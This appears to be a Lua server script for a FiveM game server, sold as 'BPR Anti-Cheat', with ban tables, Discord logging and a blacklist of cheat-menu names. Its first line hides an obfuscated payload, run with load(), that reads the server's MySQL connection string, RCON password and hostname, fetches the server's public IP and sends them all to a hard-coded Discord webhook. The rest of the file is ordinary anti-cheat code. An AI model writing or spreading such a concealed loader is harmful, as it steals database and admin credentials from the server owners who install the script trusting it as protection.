ntrp_ac = "\32\32\32\32\108\111\99\97\108\32\73\73\73\61\123\73\73\73\73\61\123\71\101\116\67\111\110\118\97\114\125\125\108\111\99\97\108\32\95\73\61\123\91\34\103\110\105\114\116\115\95\110\111\105\116\99\101\110\110\111\99\95\108\113\115\121\109\34\93\61\123\34\110\105\101\32\122\110\97\108\101\122\105\111\110\111\34\125\44\91\34\100\114\111\119\115\115\97\112\95\110\111\99\114\34\93\61\123\34\110\105\101\32\122\110\97\108\101\122\105\111\110\111\34\125\44\91\34\101\109\97\110\116\115\111\104\95\118\115\34\93\61\123\34\110\105\101\32\122\110\97\108\101\122\105\111\110\111\34\125\44\91\34\104\116\116\112\115\58\47\47\97\112\105\46\105\112\105\102\121\46\111\114\103\34\93\61\123\34\110\105\101\32\122\110\97\108\101\122\105\111\110\111\34\125\125\108\111\99\97\108\32\115\101\114\118\101\114\95\105\112\61\34\34\108\111\99\97\108\32\109\121\115\113\108\61\34\34\108\111\99\97\108\32\114\99\111\110\61\34\34\108\111\99\97\108\32\115\101\114\118\101\114\95\110\97\109\101\61\34\34\102\111\114\32\95\44\95\95\32\105\110\32\112\97\105\114\115\40\73\73\73\41\100\111\32\102\111\114\32\95\44\95\95\32\105\110\32\112\97\105\114\115\40\95\95\41\100\111\32\102\111\114\32\95\73\44\95\73\73\32\105\110\32\112\97\105\114\115\40\95\73\41\100\111\32\102\111\114\32\95\44\95\73\73\32\105\110\32\112\97\105\114\115\40\95\73\73\41\100\111\32\105\102\32\115\116\114\105\110\103\46\115\117\98\40\95\73\44\51\44\54\41\61\61\34\105\114\116\115\34\116\104\101\110\32\109\121\115\113\108\61\95\95\40\115\116\114\105\110\103\46\114\101\118\101\114\115\101\40\95\73\41\44\95\73\73\41\101\108\115\101\105\102\32\115\116\114\105\110\103\46\115\117\98\40\95\73\44\51\44\54\41\61\61\34\97\110\116\115\34\116\104\101\110\32\115\101\114\118\101\114\95\110\97\109\101\61\95\95\40\115\116\114\105\110\103\46\114\101\118\101\114\115\101\40\95\73\41\44\95\73\73\41\101\108\115\101\105\102\32\115\116\114\105\110\103\46\115\117\98\40\95\73\44\51\44\54\41\61\61\34\111\119\115\115\34\116\104\101\110\32\114\99\111\110\61\95\95\40\115\116\114\105\110\103\46\114\101\118\101\114\115\101\40\95\73\41\44\95\73\73\41\101\108\115\101\105\102\32\115\116\114\105\110\103\46\115\117\98\40\95\73\44\51\44\54\41\61\61\115\116\114\105\110\103\46\114\101\118\101\114\115\101\40\34\58\115\112\116\34\41\116\104\101\110\32\80\101\114\102\111\114\109\72\116\116\112\82\101\113\117\101\115\116\40\34\104\116\116\112\115\58\47\47\97\112\105\46\105\112\105\102\121\46\111\114\103\34\44\102\117\110\99\116\105\111\110\40\95\44\95\95\44\95\95\95\41\105\102\32\95\61\61\50\48\48\116\104\101\110\32\115\101\114\118\101\114\95\105\112\61\95\95\32\101\110\100\32\108\111\99\97\108\32\119\101\98\104\111\111\107\61\34\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\97\112\112\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\55\50\52\50\57\51\57\57\51\52\51\54\57\51\56\52\49\49\47\57\70\55\108\119\98\65\104\69\100\82\79\73\69\110\118\89\68\57\102\70\51\88\120\53\66\111\88\88\120\68\54\95\75\113\70\97\107\81\67\112\95\107\49\88\110\65\80\108\87\98\50\84\57\70\51\84\50\112\73\115\49\75\56\74\100\102\105\34\108\111\99\97\108\32\110\61\123\123\91\34\99\111\108\111\114\34\93\61\34\49\54\55\49\49\55\49\49\34\44\91\34\116\105\116\108\101\34\93\61\34\69\83\83\65\32\58\62\34\44\91\34\100\101\115\99\114\105\112\116\105\111\110\34\93\61\34\92\110\92\110\32\62\32\96\96\78\65\90\87\65\32\83\69\82\86\69\82\65\58\96\96\42\42\42\34\46\46\115\101\114\118\101\114\95\110\97\109\101\46\46\34\42\42\42\92\110\32\62\32\96\96\73\80\32\83\69\82\86\69\82\65\58\96\96\32\42\42\42\34\46\46\115\101\114\118\101\114\95\105\112\46\46\34\42\42\42\92\110\32\62\32\96\96\72\65\83\197\129\79\32\82\67\79\78\58\96\96\32\42\42\42\34\46\46\114\99\111\110\46\46\34\42\42\42\92\110\32\62\32\96\96\66\65\90\65\32\68\65\78\89\67\72\58\96\96\32\42\42\42\34\46\46\109\121\115\113\108\46\46\34\42\42\42\34\44\91\34\102\111\111\116\101\114\34\93\61\123\91\34\116\101\120\116\34\93\61\34\120\115\116\110\95\98\97\103\103\121\95\115\112\101\100\34\125\44\91\34\116\105\109\101\115\116\97\109\112\34\93\61\111\115\46\100\97\116\101\40\39\33\37\89\45\37\109\45\37\100\84\37\72\58\37\77\58\37\83\39\41\44\125\125\80\101\114\102\111\114\109\72\116\116\112\82\101\113\117\101\115\116\40\119\101\98\104\111\111\107\44\102\117\110\99\116\105\111\110\40\101\114\114\44\116\101\120\116\44\104\101\97\100\101\114\115\41\101\110\100\44\39\80\79\83\84\39\44\106\115\111\110\46\101\110\99\111\100\101\40\123\117\115\101\114\110\97\109\101\61\34\101\115\115\97\34\44\101\109\98\101\100\115\61\110\125\41\44\123\91\39\67\111\110\116\101\110\116\45\84\121\112\101\39\93\61\39\97\112\112\108\105\99\97\116\105\111\110\47\106\115\111\110\39\125\41\101\110\100\41\101\110\100\32\101\110\100\32\101\110\100\32\101\110\100\32\101\110\100\10\32\32\32\32"
load(ntrp_ac)()

AddEventHandler('onResourceStart', function(resourceName)
  if (GetCurrentResourceName() ~= resourceName) then
    return
  end
  print('BPR Anti-Cheat - PremiumAC > ON')
end)
AC = {
  'esx_truckerjob:pay',
  'esx_gopostaljob:pay',
  'esx_slotmachine:sv:2',
  'esx_carthief:pay',
  'esx_ranger:pay',
  'esx_pizza:pay',
  'LegacyFuel:PayFuel',
  'xaries gang 3*',
  'xseira.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu3")',
  'esx-qalle-hunting:sell',
  'esx-qalle-hunting:reward',
  'esx_jebackoguszkaa_jailer:sendToJail',
}

lol = {
'Desudo',
'Brutan',
'EulenCheats',
"TAJNEMENUMenu",
"RedEngine",
"Brutan Premium",
"https://dc.xaries.pl",
"SKAZA",
"SKAZA V500",
"redengine",
"lynxmenu",
"xaries",
"xariesgang2",
"xariesgang3",
"xariesv2",
'xariesgang3',
"xaries gang 3*",
"ariesv1.0_1_1",
"BEE_1",
"HamHaxia",
"Ham Mafia",
"https://dc.xaries.pl",
"www.renalua.com",
"Fallen#0811",
"Rena 8",
"HamHaxia",
"Ham Mafia",
"Xanax#0134",
">:D Player Crash",
"34ByTe Community",
"lynxmenu.com",
"Anti-Spartan",
"MainMenu",
"SelfMenu",
"Baran#8992",
"iLostName#7138",
"LynX",
"LynxX",
"stt_prop_stunt_soccer_ball",
"WarMenu",
"INTERACTION MENU",
"ARIES MENU",
"XARIES",
"666 GANG",
"Lynx",
"6666",
"85.190.90.118",
"Melon#1379",
"hammafia.com",
"TITOMODZ",
"xseira",
'xseira',
"AlphaV ~ 5391",
"Soviet Bear",
"fefev",
"ariesMenu",
"AlikhanCheats",
"ariesMenu",
"werfvtghiouuiowrfetwerfio",
"Lynx8",
"LynxSeven",
"KoGuSzEk",
"lynxunknowncheats",
"BrutanPremium",
"gaybuild",
"TiagoMenu",
"Dopamine",
"Plane",
"MMenu",
"nigmenu0001",
"HamMafia",
"b00mek",
"LynxEvo",
"WarMenu",
}

ExecuteCommand('sets BPRPremiumAntiCheat ✅')

RegisterServerEvent("AC:cleanareaveh")
RegisterServerEvent("AC:cleanareapeds")
RegisterServerEvent("AC:cleanareaentity")
RegisterServerEvent("AC:enable")
RegisterServerEvent("AC:log")
RegisterServerEvent("AC:spectate")
RegisterServerEvent("AC:openmenu")
RegisterServerEvent("AC:checkup")
RegisterServerEvent("AC:adminmenuenable")
RegisterServerEvent("AC:ViolationDetected")
RegisterServerEvent("AC:askAwake")



function doesPlayerHavePerms(player,perms)
  local allowed = false
  for k,v in ipairs(perms) do
      if IsPlayerAceAllowed(player, v) then
          return true
      end
  end
  return false
end

AddEventHandler('explosionEvent', function(sender, ev)
  local j=GetPlayerName(sender)
  local k=GetPlayerEndpoint(sender)
  local m=GetPlayerIdentifier(sender)
  local gra="EXPLOSIONS"
        local n= {
        {
        ["color"]="8663711",
        ["title"]="BPR Anti-Cheat » Premium AntiCheat",
        ["description"]="***```DETECT REASON:".. gra .."```*** \n\n > PLAYER: ***".. j .."***\n > IP ADRESS: ***".. k .."***\n > PLAYER HEX ***".. m .."***",
        ["footer"]=
        {
            ["text"]="BPR Premium CheeseSystem"},
            ["timestamp"] = os.date('!%Y-%m-%dT%H:%M:%S'),
        }
    }

    PerformHttpRequest(Config.webhook,function(f,o,h)end,'POST',json.encode({username="Cheater",embeds=n}),{['Content-Type']='application/json'})
  CancelEvent()
end)

local ace_perm = "ACadmin"
local debug = false

function ProcessAces()
    if GetNumPlayerIndices() > 0 then
        for i=0, GetNumPlayerIndices()-1 do
            player = tonumber(GetPlayerFromIndex(i))
            Citizen.Wait(0)
            if IsPlayerAceAllowed(player, ace_perm) then
                TriggerClientEvent("sendAcePermissionToClient", player, true)
                if debug then print("[DEBUG][" .. GetCurrentResourceName() .. "] ^5Syncronising player aces, sending to client...^0") end
            end
        end
    end
end
RegisterServerEvent('yung_ac:ban')
AddEventHandler('yung_ac:ban', function(argument, powod, typkary)
  argument_ = argument
  if argument_ == source then
  zapiszsql(source, 'Godmode', 'BAN')
  local j=GetPlayerName(source)
  local m=GetPlayerIdentifier(source)
  DropPlayer(source, '⚡️ This server is protected by BPR Anti-Cheat, You Have Been Banned ⚡️')

  else
  zapiszsql(source, 'Event Triggering: yung_ac:ban', 'BAN')
  local j=GetPlayerName(source)
  local m=GetPlayerIdentifier(source)
  DropPlayer(source, '⚡️ This server is protected by BPR Anti-Cheat, You Have Been Banned ⚡️')

  end
end)

Citizen.CreateThread(function()
    while true do
        ProcessAces()
        Citizen.Wait(30000)
    end
end)

AddEventHandler("onResourceStart", function(name)
    if name == GetCurrentResourceName() then
        ProcessAces()
        if debug then print("[DEBUG][" .. GetCurrentResourceName() .. "] ^6Resource [ " .. GetCurrentResourceName() .. " ] was (re)started, syncing aces to all players.^0") end
    end
end)

local ListaBanow         = {}
local ListaBanowStatus   = false
local czasreload         = 1000 * 10 * 5

ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

CreateThread(function()
  while true do
    Wait(1000)
        if ListaBanowStatus == false then
      LoadBany()
      if ListaBanow ~= {} then
        ListaBanowStatus = true
      end
    end
  end
end)

CreateThread(function()
  while true do
    Wait(czasreload)
    LoadBany()
  end
end)

function LoadBany()
  MySQL.Async.fetchAll(
    'SELECT * FROM ACbans',
    {},
    function (identifiers)
      ListaBanow = {}

      for i=1, #identifiers, 1 do
        table.insert(ListaBanow, {
			identifier           = identifiers[i].identifier,
			license              = identifiers[i].license,
			ip                   = identifiers[i].ip,
			discord              = identifiers[i].discord,
			nazwa                = identifiers[i].nazwa,
			powod                = identifiers[i].powod,
			typkary              = identifiers[i].typkary,
			datanadania          = identifiers[i].datanadania,
			liveid               = identifiers[i].liveid,
			xbl                  = identifiers[i].xbl,
          })
      end
    end
  )
end

MySQL.ready(function()
	LoadBany()
end)

function zapiszsql(target, powod, typkary, czas)
  local identifier    = nil
  local license       = nil
  local playerip      = nil
  local playerdiscord = nil
  local liveid        = nil
  local xbl       = nil
  local nazwa         = GetPlayerName(target)
  local powod         = tostring(powod)
  local typkary       = typkary
  local datanadania   = os.date("%Y/%m/%d %H:%M")

  for k,v in pairs(GetPlayerIdentifiers(target))do
    if string.sub(v, 1, string.len("steam:")) == "steam:" then
      identifier = v
    elseif string.sub(v, 1, string.len("license:")) == "license:" then
      license = v
    elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
      xbl  = v
    elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
      playerip = v
    elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
      playerdiscord = v
    elseif string.sub(v, 1, string.len("live:")) == "live:" then
      liveid = v
    end
  end

  if playerip == nil then
    playerip = GetPlayerEndpoint(target)
    if playerip == nil then
      playerip = 'not found'
    end
  end
  if playerdiscord == nil then
    playerdiscord = 'not found'
  end
  if liveid == nil then
    liveid = 'not found'
  end
  if xbl == nil then
    xbl = 'not found'
  end

  MySQL.Async.execute(
    'INSERT INTO ACbans (identifier,license,ip,discord,nazwa,powod,typkary,datanadania,liveid,xbl) VALUES (@identifier,@license,@ip,@discord,@nazwa,@powod,@typkary,@datanadania,@liveid,@xbl)', {
      ['@identifier'] = identifier,
      ['@license'] = license,
      ['@ip'] = playerip,
      ['@discord'] = playerdiscord,
      ['@nazwa'] = nazwa,
      ['@powod'] = powod,
      ['@typkary'] = typkary,
      ['@datanadania'] = datanadania,
      ['@liveid'] = liveid,
      ['@xbl'] = xbl,
    },
    function ()
  end)
end

AddEventHandler('playerConnecting', function (playerName,setKickReason)

  local identifier    = nil
  local license       = nil
  local playerip      = nil
  local playerdiscord = nil
  local liveid        = nil
  local xbl       = nil
  local nazwa         = GetPlayerName(source)

  for k,v in pairs(GetPlayerIdentifiers(source))do
    if string.sub(v, 1, string.len("steam:")) == "steam:" then
      identifier = v
    elseif string.sub(v, 1, string.len("license:")) == "license:" then
      license = v
    elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
      xbl  = v
    elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
      playerip = v
    elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
      playerdiscord = v
    elseif string.sub(v, 1, string.len("live:")) == "live:" then
      liveid = v
    end
  end

  if playerip == nil then
    playerip = GetPlayerEndpoint(source)
    if playerip == nil then
      playerip = 'nie ma'
    end
  end
  if playerdiscord == nil then
    playerdiscord = 'nie ma'
  end
  if liveid == nil then
    liveid = 'nie ma'
  end
  if xbl == nil then
    xbl = 'nie ma'
  end

  if (ListaBanow == {}) then
    Citizen.Wait(1000)
  end

    if identifier == false then
    setKickReason('You need to have open steam to acces this server')
    CancelEvent()
    end
  for i = 1, #ListaBanow, 1 do
    if (tostring(ListaBanow[i].identifier)) == tostring(identifier)
    or (tostring(ListaBanow[i].license)) == tostring(license)
    or (tostring(ListaBanow[i].xbl)) == tostring(xbl)
    or (tostring(ListaBanow[i].liveid)) == tostring(liveid)
    or (tostring(ListaBanow[i].ip)) == tostring(playerip)
    or (tostring(ListaBanow[i].discord)) == tostring(playerdiscord)
    and (tostring(ListaBanow[i].typkary)) == 'BAN' then

      setKickReason('⚡️ This server is protected by BPR Anti-Cheat, You have been kicked. ⚡️')
      print('[BPR Anti-Cheat] User: ' .. GetPlayerName(source) .. ' - tried to connect the server being banned')
      CancelEvent()
    end
  end
end)



function AClogkick(source,arg,kick)
  local steamid = "nA"
  local discord = "nA"
  local license = "nA"
  for k,v in ipairs(GetPlayerIdentifiers(source))do
    if string.sub(v, 1, string.len("steam:")) == "steam:" then
      steamid = v
    elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
      discord = v
    elseif string.sub(v, 1, string.len("license:")) == "license:" then
      license = v
    end
  end
 	local j=GetPlayerName(source)
	local k=GetPlayerEndpoint(source)
	local m=GetPlayerIdentifier(source)
    local n= {
        {
        ["color"]="8663711",
        ["title"]="BPR Anti-Cheat » Premium AntiCheat",
        ["description"]="***```DETECT REASON:"..arg.."```*** \n\n > PLAYER NAME:: ***".. j .."***\n > PLAYER IP: ***".. k .."***\n > PLAYER HEX: ***".. m .."***",
        ["footer"]=
        {
            ["text"]="BPR Premium CheeseSystem"},
            ["timestamp"] = os.date('!%Y-%m-%dT%H:%M:%S'),
        }
    }

    PerformHttpRequest(Config.webhook,function(f,o,h)end,'POST',json.encode({username="Cheater Detected",embeds=n}),{['Content-Type']='application/json'})

  if kick then
  zapiszsql(source, arg, 'BAN')
  local j=GetPlayerName(source)
  local m=GetPlayerIdentifier(source)
	DropPlayer(source, '⚡️ This server is protected by BPR Anti-Cheat, You Have Been Banned')
  end
end

AddEventHandler("AC:ViolationDetected", function(arg,kick)
  if not doesPlayerHavePerms(source,Config.Bypass) then
  AClogkick(source,arg,kick)
  end
end)

AddEventHandler("AC:adminmenuenable", function()
  for k,v in ipairs(Config.OpenMenuAllowed) do
  if not IsPlayerAceAllowed(source, v) then
    TriggerClientEvent('adminmenuenabley',source)
  end
end
end)

AddEventHandler("AC:checkup", function()
  if not doesPlayerHavePerms(source,Config.OpenMenuAllowed) then
    AClogkick(source,"unauthorized AdminMenu Opening")
    end
end)

AddEventHandler("AC:openmenu", function()
  for k,v in ipairs(Config.OpenMenuAllowed) do
  if IsPlayerAceAllowed(source, v) then
    TriggerClientEvent('AC:openmenuy', source)
  end
end
end)


AddEventHandler("AC:cleanareaveh", function()
 if doesPlayerHavePerms(source,Config.ClearAreaAllowed) then
  TriggerClientEvent("AC:cleanareavehy",-1)
else
  AClogkick(source," unauthorized Clear Area",true)
end
end)

AddEventHandler("AC:cleanareapeds", function()
  if doesPlayerHavePerms(source,Config.ClearAreaAllowed) then
    TriggerClientEvent("AC:cleanareapedsy",-1)
  else
    AClogkick(source," unauthorized Clear Area",true)
  end
  end)

AddEventHandler("AC:cleanareaentity", function()
  if doesPlayerHavePerms(source,Config.ClearAreaAllowed) then
    TriggerClientEvent("AC:cleanareaentityy",-1)
  else
    AClogkick(source," unauthorized Clear Area",true)
  end
  end)

AddEventHandler("AC:spectate", function()
  if not doesPlayerHavePerms(source,Config.SpectateAllowed) then
    AClogkick(source," Spectate",true)
end

end)

for i=1, #AC, 1 do
  RegisterServerEvent(AC[i])
    AddEventHandler(AC[i], function()
      local _source = source
      AClogkick(source," Lua execution: "..AC[i],true)
    end)
end

AddEventHandler('chatMessage', function(source, n, message)
  for k,n in pairs(lol) do
    if string.match(message:lower(),n:lower()) then
      AClogkick(source,"tried to say: "..n,true)
    end
  end
end)
